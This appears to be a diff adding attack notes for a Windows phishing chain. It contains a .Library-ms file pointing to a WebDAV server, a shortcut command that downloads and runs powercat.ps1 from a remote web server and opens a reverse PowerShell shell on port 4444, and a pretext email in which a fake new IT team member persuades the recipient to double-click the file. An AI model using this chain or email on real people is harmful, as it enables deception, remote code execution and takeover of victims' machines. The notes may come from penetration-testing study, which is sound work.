@@ -1,0 +1,44 @@
+Put the files to webdav (.lnk, Library-ms) and powercat.ps1 on python webserver
+
+
+.Library-ms file (change the url):
+the serialized tag (inserted automaticly after open) should be deleted before sent
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.0.0</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+
+
+.lnk: (name it automatic_configuration)
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.0:8000/powercat.ps1');
+powercat -c 192.168.0.0 -p 4444 -e powershell"
+
+
+Example email content:
+Hello! My name is Dwight, and I'm a new member of the IT Team. 
+
+This week I am completing some configurations we rolled out last week.
+To make this easier, I've attached a file that will automatically
+perform each step. Could you download the attachment, open the
+directory, and double-click "automatic_configuration"? Once you
+confirm the configuration in the window that appears, you're all done!
+
+If you have any questions, or run into any problems, please let me
+know!
